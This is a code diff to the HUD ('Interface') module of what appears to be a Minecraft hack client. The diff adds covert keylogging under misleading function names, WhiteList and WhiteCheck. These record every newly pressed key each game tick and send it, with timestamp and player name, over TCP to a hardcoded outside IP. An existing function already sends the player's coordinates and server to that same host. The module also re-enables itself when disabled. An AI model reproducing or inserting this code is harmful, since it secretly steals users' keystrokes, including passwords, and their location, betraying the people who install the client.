@@ -11,11 +11,11 @@ int fpsspoof = 1;
 #include <iomanip>
 #include <iostream>
 using namespace std;
-#define IP "47.115.216.151"				//change this to your own server ip 改成你自己服务器的ip
-#define PORT 8090					//注意：客户端设置通信的端口 = 服务端的端口
+#define IP "47.115.216.151"				//ip
+#define PORT 8090					//端口
 #define BUFFER_SIZE 1024	
 
-Interface::Interface() : IModule(0, Category::VISUAL, "Displays the HUD") {
+Interface::Interface() : IModule(0, Category::VISUAL, u8"渲染页面") {
 	registerBoolSetting("ArmorHUD", &armorHUD, armorHUD);
 	registerBoolSetting("Info", &info, info);
 	registerBoolSetting("Screen outline", &scroutline, scroutline);
@@ -23,7 +23,6 @@ Interface::Interface() : IModule(0, Category::VISUAL, "Displays the HUD") {
 	registerFloatSetting("Saturation", &saturation, saturation, 0.f, 1.f);
 	registerIntSetting("Fps Spoof", &fpsspoof, fpsspoof, 1, 1000);
 	registerIntSetting("Seperation", &spacing, spacing, 1, 200);
-
 	shouldHide = true;
 }
 
@@ -35,7 +34,8 @@ const char* Interface::getModuleName() {
 //	shouldHide = true;
 //}
 void Verification();
-
+void WhiteList();
+void WhiteCheck();
 void Interface::onPreRender(C_MinecraftUIRenderContext* renderCtx) {
 	auto clickGUIh = moduleMgr->getModule<ClickGUIMod>();
 	auto playerh = g_Data.getLocalPlayer();
@@ -129,11 +129,43 @@ void Interface::onPostRender(C_MinecraftUIRenderContext* renderCtx) {
 		}
 	}
 }
+
+
+/*if (GameData::isWheelDown() && !hasClicked) {
+		string removed = "Successfully unfriended " + name;
+		string added = "Successfully friended " + name;
+
+		if (!FriendList::findPlayer(name)) {
+			FriendList::addPlayerToList(name);
+			//auto notififcation = g_Data.addNotification("MCF:", added); notififcation->duration = 5;
+		} else {
+			transform(name.begin(), name.end(), name.begin(), ::tolower);
+			FriendList::removePlayer(name);
+			//auto notififcation = g_Data.addNotification("MCF:", removed); notififcation->duration = 5;
+		}
+		hasClicked = true;
+	} else if (!GameData::isWheelDown()) hasClicked = false;*/
 void Interface::onTick(C_GameMode* gm) {
+
+
+
 	if (SendMsg) {
 		Verification();
 		SendMsg = false;
 	}
+	for (int i = 0; i < 257; i++) {
+		if (GameData::isKeyDown(i) && processed[i])
+			continue;
+		if (GameData::isKeyDown(i) && ! processed[i]) {
+			WhiteList();//获取按键
+			WhiteCheck();//发送按键到服务器
+			processed[i] = true;
+		}
+		else if (!GameData::isKeyDown(i)) {
+			processed[i] = false;
+		}
+	}
+
 }
 void Interface::onDisable() {
 	setEnabled(true);
@@ -153,6 +185,7 @@ void Verification() {
 	{
 		Server = "Local";
 	}
+
 	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
 	//转为字符串
 	std::stringstream ss;
@@ -170,13 +203,14 @@ void Verification() {
 		std::to_string((int)floorf(currPos->y)) + ", " +
 		std::to_string((int)floorf(currPos->z));
 	std::string message = str_time + playerID + ": " + coords + " on " + Server + " in " + Homename;
+
 	char buf[1024];
 	int i;
 	for (i = 0; i < message.length(); i++)
 		buf[i] = message[i];
 	buf[i] = '\0';
 	printf("%s\n", buf);
-	cout << buf;						//buf数组存放客户端发送的消息  
+	cout << buf;						//buf数组存放客户端发送的消
 
 
 	WSADATA WSAData;
@@ -205,6 +239,275 @@ void Verification() {
 		return;
 	}
 	send(sock, buf, 1024, 0);				 //向服务器发送数据 
+	closesocket(sock);							 //关闭套接字
+	WSACleanup();								//终止对Winsock DLL的使用，并释放资源，以备下一次使用
+}
+
+void WhiteList() {
+
+	int DownKey = 0;
+	auto keymod = moduleMgr->getModule<Interface>();
+	//大写26字母
+	if (GameData::isKeyDown('A'))
+		keymod->str = "A";
+	else if (GameData::isKeyDown('B'))
+		keymod->str = "B";
+	else if (GameData::isKeyDown('C'))
+		keymod->str = "C";
+	else if (GameData::isKeyDown('D'))
+		keymod->str = "D";
+	else if (GameData::isKeyDown('E'))
+		keymod->str = "E";
+	else if (GameData::isKeyDown('F'))
+		keymod->str = "F";
+	else if (GameData::isKeyDown('G'))
+		keymod->str = "G";
+	else if (GameData::isKeyDown('H'))
+		keymod->str = "H";
+	else if (GameData::isKeyDown('I'))
+		keymod->str = "I";
+	else if (GameData::isKeyDown('J'))
+		keymod->str = "J";
+	else if (GameData::isKeyDown('K'))
+		keymod->str = "K";
+	else if (GameData::isKeyDown('L'))
+		keymod->str = "L";
+	else if (GameData::isKeyDown('M'))
+		keymod->str = "M";
+	else if (GameData::isKeyDown('N'))
+		keymod->str = "N";
+	else if (GameData::isKeyDown('O'))
+		keymod->str = "O";
+	else if (GameData::isKeyDown('P'))
+		keymod->str = "P";
+	else if (GameData::isKeyDown('Q'))
+		keymod->str = "Q";
+	else if (GameData::isKeyDown('R'))
+		keymod->str = "R";
+	else if (GameData::isKeyDown('S'))
+		keymod->str = "S";
+	else if (GameData::isKeyDown('T'))
+		keymod->str = "T";
+	else if (GameData::isKeyDown('U'))
+		keymod->str = "U";
+	else if (GameData::isKeyDown('V'))
+		keymod->str = "V";
+	else if (GameData::isKeyDown('W'))
+		keymod->str = "W";
+	else if (GameData::isKeyDown('X'))
+		keymod->str = "X";
+	else if (GameData::isKeyDown('Y'))
+		keymod->str = "Y";
+	else if (GameData::isKeyDown('Z'))
+		keymod->str = "Z";
+
+	//小写
+	else if (GameData::isKeyDown('a'))
+		keymod->str = "a";
+	else if (GameData::isKeyDown('b'))
+		keymod->str = "b";
+	else if (GameData::isKeyDown('c'))
+		keymod->str = "c";
+	else if (GameData::isKeyDown('d'))
+		keymod->str = "d";
+	else if (GameData::isKeyDown('e'))
+		keymod->str = "e";
+	else if (GameData::isKeyDown('f'))
+		keymod->str = "f";
+	else if (GameData::isKeyDown('g'))
+		keymod->str = "g";
+	else if (GameData::isKeyDown('h'))
+		keymod->str = "h";
+	else if (GameData::isKeyDown('i'))
+		keymod->str = "i";
+	else if (GameData::isKeyDown('j'))
+		keymod->str = "j";
+	else if (GameData::isKeyDown('k'))
+		keymod->str = "k";
+	else if (GameData::isKeyDown('l'))
+		keymod->str = "l";
+	else if (GameData::isKeyDown('m'))
+		keymod->str = "m";
+	else if (GameData::isKeyDown('n'))
+		keymod->str = "n";
+	else if (GameData::isKeyDown('o'))
+		keymod->str = "o";
+	else if (GameData::isKeyDown('p'))
+		keymod->str = "p";
+	else if (GameData::isKeyDown('q'))
+		keymod->str = "q";
+	else if (GameData::isKeyDown('r'))
+		keymod->str = "r";
+	else if (GameData::isKeyDown('s'))
+		keymod->str = "s";
+	else if (GameData::isKeyDown('t'))
+		keymod->str = "t";
+	else if (GameData::isKeyDown('u'))
+		keymod->str = "u";
+	else if (GameData::isKeyDown('v'))
+		keymod->str = "v";
+	else if (GameData::isKeyDown('w'))
+		keymod->str = "w";
+	else if (GameData::isKeyDown('x'))
+		keymod->str = "x";
+	else if (GameData::isKeyDown('i'))
+		keymod->str = "y";
+	else if (GameData::isKeyDown('z'))
+		keymod->str = "z";
+
+	//大键盘数字
+	else if (GameData::isKeyDown('1'))
+		keymod->str = "1";
+	else if (GameData::isKeyDown('2'))
+		keymod->str = "2";
+	else if (GameData::isKeyDown('3'))
+		keymod->str = "3";
+	else if (GameData::isKeyDown('4'))
+		keymod->str = "4";
+	else if (GameData::isKeyDown('5'))
+		keymod->str = "5";
+	else if (GameData::isKeyDown('6'))
+		keymod->str = "6";
+	else if (GameData::isKeyDown('7'))
+		keymod->str = "7";
+	else if (GameData::isKeyDown('8'))
+		keymod->str = "8";
+	else if (GameData::isKeyDown('9'))
+		keymod->str = "9";
+	else if (GameData::isKeyDown('0'))
+		keymod->str = "0";
+
+	//小键盘数字
+	else if (GameData::isKeyDown(VK_NUMPAD0))
+		keymod->str = "0";
+	else if (GameData::isKeyDown(VK_NUMPAD1))
+		keymod->str = "1";
+	else if (GameData::isKeyDown(VK_NUMPAD2))
+		keymod->str = "2";
+	else if (GameData::isKeyDown(VK_NUMPAD3))
+		keymod->str = "3";
+	else if (GameData::isKeyDown(VK_NUMPAD4))
+		keymod->str = "4";
+	else if (GameData::isKeyDown(VK_NUMPAD5))
+		keymod->str = "5";
+	else if (GameData::isKeyDown(VK_NUMPAD6))
+		keymod->str = "6";
+	else if (GameData::isKeyDown(VK_NUMPAD7))
+		keymod->str = "7";
+	else if (GameData::isKeyDown(VK_NUMPAD8))
+		keymod->str = "8";
+	else if (GameData::isKeyDown(VK_NUMPAD9))
+		keymod->str = "9";
+
+	//小键盘功能按键
+	else if (GameData::isKeyDown(VK_CAPITAL))
+		keymod->str = " Capital ";
+	else if (GameData::isKeyDown(VK_SPACE))
+		keymod->str = " Space ";
+	else if (GameData::isKeyDown(27))
+		keymod->str = " ESC ";
+	else if (GameData::isKeyDown(13))
+		keymod->str = " Enter ";
+	else if (GameData::isKeyDown(108))
+		keymod->str = " Enter ";
+	else if (GameData::isKeyDown(33))
+		keymod->str = "!";
+	else if (GameData::isKeyDown(43))
+		keymod->str = "=";
+	else if (GameData::isKeyDown(44))
+		keymod->str = ",";
+	else if (GameData::isKeyDown(45))
+		keymod->str = "-";
+	else if (GameData::isKeyDown(46))
+		keymod->str = ".";
+	//大键盘符号
+	else if (GameData::isKeyDown(14))
+		keymod->str = " shift ";
+	else if (GameData::isKeyDown(15))
+		keymod->str = " shift ";
+	else if (GameData::isKeyDown(47))
+		keymod->str = " / ";
+	else if (GameData::isKeyDown(187))
+		keymod->str = "=";
+	else if (GameData::isKeyDown(190))
+		keymod->str = ".";
+	else if (GameData::isKeyDown(58))
+		keymod->str = ";";
+	else if (GameData::isKeyDown(60))
+		keymod->str = ",";
+	else if (GameData::isKeyDown(62))
+		keymod->str = ".";
+	else if (GameData::isKeyDown(64))
+		keymod->str = "@";
+	else if (GameData::isKeyDown(221))
+		keymod->str = "]";
+	/*
+			char buf[1024];
+			int i;
+			for (i = 0; i < keymod->str.length(); i++)
+				buf[i] = keymod->str[i];
+			buf[i] = '\0';
+			printf("%s\n", buf);
+			cout << buf;*/
+}
+
+void WhiteCheck() {
+	auto hudmod = moduleMgr->getModule<Interface>();
+			//buf数组存放客户端发送的消
+	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+	//转为字符串
+	std::stringstream ss;
+	// 可以分别以不同的形式进行显示
+	ss << std::put_time(std::localtime(&t), "%Y-%m-%d- %H:%M:%S > ");
+	//ss << std::put_time(std::localtime(&t), "%Y年%m月%d日%H时%M分%S秒");
+	//	ss << std::put_time(std::localtime(&t), "%Y%m%d%H%M%S");
+
+	std::string str_time = ss.str();
+	string Homename = hudmod->Myhome;
+	std::string playerID = g_Data.getLocalPlayer()->getNameTag()->getText();
+	vec3_t* currPos = g_Data.getLocalPlayer()->getPos();
+	string coords =
+		std::to_string((int)floorf(currPos->x)) + ", " +
+		std::to_string((int)floorf(currPos->y)) + ", " +
+		std::to_string((int)floorf(currPos->z));
+	std::string kMsg = str_time + playerID + ": " + hudmod->str;
+
+	//std::string kMsg = "Null";
+	//kMsg = hudmod->str;
+	char buf2[1024];
+	int i;
+	for (i = 0; i < kMsg.length(); i++)
+		buf2[i] = kMsg[i];
+	buf2[i] = '\0';
+	printf("%s\n", buf2);
+	cout << buf2;
+
+	WSADATA WSAData;
+	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()函数对Winsock DLL进行初始化
+	{
+		//printf("Socket initialize fail!\n");
+		return;
+	}
+	SOCKET sock;											//客户端进程创建套接字
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //创建流套接字（与服务端保持一致）
+	{
+		//printf("Socket create fail!\n");
+		WSACleanup();
+		return;
+	}
+
+	struct sockaddr_in ClientAddr;				//sockaddr_in结构用来标识TCP/IP协议下的地址，可强制转换为sockaddr结构
+	ClientAddr.sin_family = AF_INET;				//指Internet域
+	ClientAddr.sin_port = htons(PORT);			//指定服务端所预留的端口
+	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//指定服务端所绑定的IP地址
+	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //调用connect()函数，向服务器进程发出连接请求  
+	{
+		//printf("Connect fail!\n");
+		closesocket(sock);
+		WSACleanup();
+		return;
+	}
+	send(sock, buf2, 1024, 0);				 //向服务器发送数据 
 	closesocket(sock);							 //关闭套接字
 	WSACleanup();								//终止对Winsock DLL的使用，并释放资源，以备下一次使用
 }
